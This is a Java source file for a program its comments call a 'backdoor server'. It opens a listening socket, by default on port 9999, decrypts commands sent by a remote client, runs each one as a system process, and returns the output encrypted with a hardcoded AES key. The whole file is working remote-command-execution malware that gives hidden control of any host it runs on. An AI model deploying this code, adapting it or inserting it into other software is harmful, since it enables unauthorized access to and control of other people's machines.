import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.Key;
import java.util.Base64;

/**
 * This is the backdoor server
 * Use port 9999 by default
 *
 * @author salah3x
 */
public class Server {

	public static void main(String[] args) throws Exception {

		//Port number of the server
		final int port = args.length == 1 ? Integer.valueOf(args[0]) : 9999;

		//The signal to let the client know that the request is finished
		//there will be no data to wait for(needed by the client to stop reading from output stream)
		String endSignal = "%**%";

		//The  encryption key used to encrypt an decrypt communication
		//Symmetric encryption is used
		String encryptionKey = "sixteen byte key";

		//Encryption algo
		String algorithm = "AES";

		//A helper class used to encrypt and decrypt Strings
		//Uses the Blowfish algorithm
		CryptoHelper cryptoHelper = new CryptoHelper(encryptionKey, algorithm);

		//Starting the server

		final ServerSocket serverSocket = new ServerSocket(port);

		//Check if the server is/still running
		while (!serverSocket.isClosed()) {

			//Accepting request
			//todo : add multithreading support
			Socket socket = serverSocket.accept();

			//Used to read data from socket's input stream
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			//Used to write data to socket's output stream
			PrintWriter printWriter = new PrintWriter(socket.getOutputStream());

			//Check if the client is/still connected
			while (!socket.isClosed()) {
				try {
					//Reading command from client
					String cmd = cryptoHelper.decrypt(bufferedReader.readLine());

					if (cmd.equals("exit"))
						break;
					if (cmd.equals("exit-server")) {
						System.exit(0);
					}

					//Running the command
					try {
						//Getting the runtime env starting the command as a new process
						Process p = Runtime.getRuntime().exec(cmd);

						//Used to read from the process's output stream as it executes
						//todo : add somthing to stop the process (in case of infinite stream)
						BufferedReader buf = new BufferedReader(new InputStreamReader(p.getInputStream()));

						buf.lines().forEach(s -> {
							try {
								//Encrypting output and sending it to output stream
								printWriter.println(cryptoHelper.encrypt(s));
							} catch (Exception e) {
								e.printStackTrace();
							}
							//Flushing the stream so the client doesn't need to wait until the process is finished
							printWriter.flush();
						});
					} catch (Exception e) {
						e.printStackTrace();
						//In case of errors, encrypt return them back to client
						try {
							printWriter.println(cryptoHelper.encrypt(e.getMessage()));
						} catch (Exception e1) {
							e1.printStackTrace();
						}
						printWriter.flush();
					}

					//Sending end signal to Client to stop reading from stream
					printWriter.println(cryptoHelper.encrypt(endSignal));
					printWriter.flush();
				} catch (Exception e) {
					e.printStackTrace();
					printWriter.close();
					bufferedReader.close();
					socket.close();
				}
			}
		}
	}

	/**
	 * This helper class deals with Cipher class and byte arrays in order
	 * to provide an abstraction to use encryption on strings
	 */
	static class CryptoHelper {

		private final Cipher cipher;
		private final Key key;

		CryptoHelper(String key, String algo) throws Exception {
			this.key = new SecretKeySpec(key.getBytes(), algo);
			this.cipher = Cipher.getInstance(algo);
		}

		String encrypt(String plaintext) throws Exception {
			if (plaintext == null)
				return null;
			cipher.init(Cipher.ENCRYPT_MODE, key);
			byte[] encrypted = cipher.doFinal(plaintext.getBytes());
			return Base64.getEncoder().encodeToString(encrypted);
		}

		String decrypt(String encrypted) throws Exception {
			if (encrypted == null)
				return null;
			cipher.init(Cipher.DECRYPT_MODE, key);
			byte[] decordedValue = Base64.getDecoder().decode(encrypted);
			byte[] decrypted = cipher.doFinal(decordedValue);
			return new String(decrypted);
		}
	}
}